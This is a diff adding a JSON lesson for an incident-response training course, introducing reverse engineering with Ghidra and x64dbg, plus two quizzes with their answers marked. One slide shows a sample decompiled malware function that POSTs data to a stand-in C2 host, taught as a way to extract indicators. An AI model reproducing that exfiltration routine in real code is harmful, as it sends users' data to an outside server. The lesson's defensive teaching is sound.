@@ -1,0 +1,117 @@
+{
+    "id": "l4",
+    "chapterId": "ch_11",
+    "title": "Introduction to Reverse Engineering 🛠️",
+    "description": "Basic disassembly, debuggers, and understanding compiled code.",
+    "xpReward": 35,
+    "estimatedMinutes": 10,
+    "section": "Code Analysis",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "When Static and Dynamic Aren't Enough 🧐",
+            "content": "# Peeking Inside the Black Box\n\n**Reverse Engineering (RE)** is the process of taking compiled machine code and translating it back into a human-readable form to understand its exact logic.\n\n**Why RE in IR?**\n- The malware is heavily packed/obfuscated.\n- The sandbox didn't trigger because the malware requires a specific command line argument.\n- You need to find a **hardcoded password** or **encryption key**.\n- You need to understand a custom network protocol to write a detection signature.\n- You are dealing with a targeted APT sample and need to find unique artifacts for attribution.\n\n**Two Main RE Techniques:**\n1.  **Disassembly (Static RE):** Analyzing the code without running it. (Tool: IDA Pro, Ghidra).\n2.  **Debugging (Dynamic RE):** Running the code step-by-step and inspecting memory. (Tool: x64dbg, OllyDbg)."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "text",
+            "title": "Assembly Language: The Bare Minimum 💾",
+            "content": "### You Don't Need to Be a Coder, But You Need to Recognize Patterns\n\nMalware on Windows is typically x86 or x64 assembly.\n\n**Key Registers (The CPU's Variables):**\n- **EAX/RAX:** Accumulator. Often holds **return values** from functions.\n- **ECX/RCX:** Counter (loops).\n- **ESP/RSP:** Stack Pointer (points to the top of the stack).\n- **EIP/RIP:** Instruction Pointer (points to the **next instruction** to execute). **The attacker's target for hijacking.**\n\n**Common Instructions:**\n| Instruction | Meaning | IR Relevance |\n| :--- | :--- | :--- |\n| `mov eax, 5` | Move value 5 into EAX | Assigning values. |\n| `push ebp` | Save base pointer on stack | Function prologue (entering a function). |\n| `call 0x401000` | Call a function | Jump to another part of the code. |\n| `cmp eax, 0` | Compare EAX to 0 | Often checks return value of a function (e.g., `InternetConnect`). |\n| `jz 0x401234` | Jump if zero (equal) | Conditional logic (e.g., 'If connection failed, exit'). |\n| `xor eax, eax` | Set EAX to 0 | Common way to clear a register. |\n\n**Analogy:** Assembly is like reading the individual steps of a recipe rather than just tasting the cake."
+        },
+        {
+            "id": "s_l4_3",
+            "type": "quiz",
+            "title": "Assembly Basics 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "In x86 assembly, which register typically holds the return value of a function?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "ESP (Stack Pointer)",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "EIP (Instruction Pointer)",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "EAX (Accumulator)",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "EBP (Base Pointer)",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "EAX is the standard register for function return values in x86 calling conventions.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_4",
+            "type": "text",
+            "title": "Introduction to Disassemblers: Ghidra 🐉",
+            "content": "### The NSA's Free Reverse Engineering Tool\n\n**Ghidra** is a free, open-source software reverse engineering (SRE) framework developed by the NSA. It is **the go-to tool** for beginners and professionals alike.\n\n**Key Features for IR Analysts:**\n1.  **Decompiler:** Converts assembly code back into **C-like pseudocode**. This is a **game-changer**. You can read the logic almost like source code.\n2.  **Graph View:** Visualizes function flow (branches, loops).\n3.  **String Search:** Find embedded strings quickly.\n4.  **Cross-References (Xrefs):** Click on a string or function to see **where in the code it is used**.\n\n**IR Workflow with Ghidra:**\n1.  Load the malware sample into a Ghidra project.\n2.  Run **Auto-Analysis**.\n3.  Go to **Window > Defined Strings**. Look for suspicious URLs, IPs, registry keys.\n4.  Click on an interesting string (e.g., `http://evil.com`).\n5.  Right-click > **References > Show References to Address**.\n6.  Ghidra shows you the **function** that uses this URL.\n7.  Look at the **Decompiler** window to see the C code that builds the HTTP request.\n\n**This is how you find hardcoded C2 servers without running the malware.**"
+        },
+        {
+            "id": "s_l4_5",
+            "type": "text",
+            "title": "Introduction to Debuggers: x64dbg 🐞",
+            "content": "### Watching the Code Execute Step-by-Step\n\nWhile Ghidra shows static code, a **debugger** lets you **control execution** and **inspect memory** in real-time.\n\n**When to Use a Debugger:**\n- The malware is packed, and you need to catch it **after** it unpacks itself in memory.\n- The malware uses **dynamic API resolution**, so Ghidra doesn't show you which functions are called.\n- You want to see the **decrypted strings** in memory.\n\n**Essential x64dbg Techniques for IR:**\n1.  **Run to User Code:** The malware starts in system loader code. Click `F9` (Run) until you reach the malware's actual entry point.\n2.  **Breakpoints:** Set a breakpoint (`F2`) on suspicious Windows API calls.\n    - **BP on `VirtualAlloc`:** See when memory is allocated (often before unpacking).\n    - **BP on `InternetConnectA`:** See the C2 server name/port.\n    - **BP on `CreateFile`:** See file creation paths.\n3.  **Dump Memory:** When you hit a breakpoint after unpacking, right-click in the Dump window > **Follow in Dump** > **Memory Address**. You can see the **unpacked, plaintext strings**.\n4.  **Scylla Plugin:** Use this to **dump the unpacked process from memory** to a file. Then you can load that dumped file into Ghidra for easier static analysis.\n\n**Safety:** **Always debug malware inside an isolated VM with snapshots.**"
+        },
+        {
+            "id": "s_l4_6",
+            "type": "code",
+            "title": "Example: Finding a C2 Domain in Ghidra 🔍",
+            "content": "**Step 1: Search for Strings**\nGhidra Search > For Strings > Filter: \"http\"\nFound: `http://malware-c2.xyz/upload.php` at address `0x00405000`.\n\n**Step 2: Find References**\nRight-click the string > References > Show References.\nGhidra shows the function at `0x00401200` references it.\n\n**Step 3: Analyze Decompiled Code**\n```c\nvoid SendData(char *data) {\n  HINTERNET hSession, hConnect, hRequest;\n  hSession = InternetOpenA(\"Mozilla/5.0\", 0, 0, 0, 0);\n  hConnect = InternetConnectA(hSession, \"malware-c2.xyz\", 80, 0, 0, 3, 0, 0);\n  hRequest = HttpOpenRequestA(hConnect, \"POST\", \"/upload.php\", 0, 0, 0, 0, 0);\n  HttpSendRequestA(hRequest, 0, 0, data, strlen(data));\n}\n```\n\n**Analysis:**\n- **C2 Domain:** `malware-c2.xyz`\n- **URI:** `/upload.php`\n- **User-Agent:** `Mozilla/5.0` (common, but still noted)\n- **Method:** POST\n\n**You've just extracted precise C2 indicators without executing the file.**"
+        },
+        {
+            "id": "s_l4_7",
+            "type": "warning",
+            "title": "The Steep Learning Curve 📈",
+            "content": "## You Don't Need to Master RE to Be a Good IR Analyst\n\n**Reality Check:** Reverse engineering takes **years** to master.\n\n**For IR purposes, your goals are limited and achievable:**\n- **Goal 1:** Extract hardcoded strings/IOCs using Ghidra.\n- **Goal 2:** Unpack a sample using a debugger to get at those strings.\n- **Goal 3:** Identify the malware family (e.g., 'This looks like TrickBot based on the mutex').\n\n**You do NOT need to understand the entire encryption algorithm or the exact flow of the keylogger.** \n\n**When to Escalate:** If you can't get the IOCs you need after 2-4 hours of effort, escalate to a dedicated **Reverse Engineer** or **Malware Analyst**. Don't spend 3 days stuck in a debugger when a simple sandbox report might have given you 80% of the answer.\n\n**Focus on getting *actionable* IOCs, not on writing a thesis.**"
+        },
+        {
+            "id": "s_l4_8",
+            "type": "quiz",
+            "title": "RE Tools Knowledge 🛠️",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_2",
+                "type": "multiple_choice",
+                "question": "Which feature of Ghidra is most helpful for an IR analyst who is not an expert in assembly language?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The Graph View",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The Decompiler (C pseudocode)",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "The Hex Editor",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "The Script Manager",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "The decompiler translates complex assembly into readable C-like code, making analysis accessible to non-experts.",
+                "xpReward": 10
+            }
+        }
+    ]
+}
